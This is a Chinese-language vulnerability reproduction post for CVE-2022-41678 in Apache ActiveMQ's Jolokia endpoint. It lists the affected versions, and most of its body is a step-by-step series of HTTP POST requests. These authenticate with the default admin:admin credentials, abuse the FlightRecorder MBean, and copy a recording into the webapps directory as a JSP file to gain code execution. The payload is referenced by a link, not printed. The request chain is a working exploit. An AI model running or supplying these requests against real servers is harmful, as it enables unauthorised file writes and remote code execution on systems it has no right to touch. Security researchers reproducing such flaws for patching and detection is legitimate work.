#  【漏洞复现】ActiveMQ-Jolokia-远程代码执行漏洞   
原创 莫大130  安全逐梦人   2023-12-01 00:07  
  
##  Apache-ActiveMQ-Jolokia-远程代码执行漏洞-CVE-2022-41678   
##  影响范围   
```
Apache ActiveMQ before 5.16.6
Apache ActiveMQ 5.17.0 before 5.17.4
Apache ActiveMQ 5.18.0 unaffected
Apache ActiveMQ 6.0.0 unaffected

```  
##  漏洞复现版本下载   
```
https://activemq.apache.org/activemq-5017000-release

```  
##  漏洞复现   
#### 新建记录  
```
POST /api/jolokia/ HTTP/1.1
Host: localhost:8161
Origin:localhost:8161
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Content-Type: application/json
Content-Length: 136

{
    "type": "EXEC",
    "mbean": "jdk.management.jfr:type=FlightRecorder",
    "operation": "newRecording",
    "arguments": []
}

```  
  
记住这个 value参数中的值，后面的poc要用到,例如现在是4  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5zWT2wCRAbUtrNHiaSorK4eMiaLJXp4E5NppQJrkSe3UOd5ZN4tshFicjSgJllo7GJLU1ma7v3vjQPw/640?wx_fmt=png&from=appmsg "")  
#### 写入payload  
  
payload太长了，放在最后了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5zWT2wCRAbUtrNHiaSorK4eibey3REQDsLTowerictF5ghBic4QZWuANyoSiaibaPlhnDKOKK2VKPicvSQQ/640?wx_fmt=png&from=appmsg "")  
  
```
POST /api/jolokia/ HTTP/1.1
Host: localhost:8161
Origin:localhost:8161
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Content-Type: application/json
Content-Length: 136

{
    "type": "EXEC",
    "mbean": "jdk.management.jfr:type=FlightRecorder",
    "operation": "setConfiguration",
    "arguments": [4,""]
}

```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5zWT2wCRAbUtrNHiaSorK4enGlCj08nuS0p8yvYUfNicKsPJeAXzyS98SKvQxcm4kj10H6CiafhEMpA/640?wx_fmt=png&from=appmsg "")  
### 导出录制到web目录  
```
POST /api/jolokia/ HTTP/1.1
Host: localhost:8161
Origin:localhost:8161
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Content-Type: application/json
Content-Length: 141

{
    "type": "EXEC",
    "mbean": "jdk.management.jfr:type=FlightRecorder",
    "operation": "startRecording",
    "arguments": [4]
}

```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5zWT2wCRAbUtrNHiaSorK4e7W2NlVW5AzS8upbUW3NhUKz04xiaAgoEHlT7PoCDJY4mc8q3oRFiaxBA/640?wx_fmt=png&from=appmsg "")  
```
POST /api/jolokia/ HTTP/1.1
Host: localhost:8161
Origin:localhost:8161
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Content-Type: application/json
Content-Length: 138

{
    "type": "EXEC",
    "mbean": "jdk.management.jfr:type=FlightRecorder",
    "operation": "stopRecording",
    "arguments": [4]
}

```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5zWT2wCRAbUtrNHiaSorK4efDVHicWf3rZroP2NODGFfVRMzPGeZaFcloFv9w3WJjsqWZRMkdVqlrg/640?wx_fmt=png&from=appmsg "")  
#### 导出到web目录  
```
POST /api/jolokia/ HTTP/1.1
Host: localhost:8161
Origin:localhost:8161
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Content-Type: application/json
Content-Length: 159

{
    "type": "EXEC",
    "mbean": "jdk.management.jfr:type=FlightRecorder",
    "operation": "copyTo",
    "arguments": [4,"../../webapps/test.jsp"]
}


```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5zWT2wCRAbUtrNHiaSorK4e5xHHf6fV3MFb7Dnwzx9WwAaXVwgjEPTiciaHdkJAUufgrelvqCEJLHhg/640?wx_fmt=png&from=appmsg "")  
#### 文件写入成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5zWT2wCRAbUtrNHiaSorK4esofQHHBfSWEPibSiaLcqUickbczKywbPDEVIQeNia5NrZKiav0f1h2icmT6g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5zWT2wCRAbUtrNHiaSorK4euicflzUheyud18dTgQucFUUNek9bUncN2aXhVPKf5UjXD1gEuAlyJuw/640?wx_fmt=png&from=appmsg "")  
##  漏洞来源   
- https://l3yx.github.io/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/  
  
- https://github.com/wy876/POC  
  
##  payload   
  
本地搭建源码，配置环境搞了好久都不行，无法调试代码，最后的payload是搜索GitHub关键字找到的  
- https://github.com/gradle/gradle-profiler/blob/2eb14e031fbd48203fb05b28183decd1ee2304de/src/main/resources/org/gradle/profiler/jfr/openjdk.jfc#L4  
  
- END -  
  
  
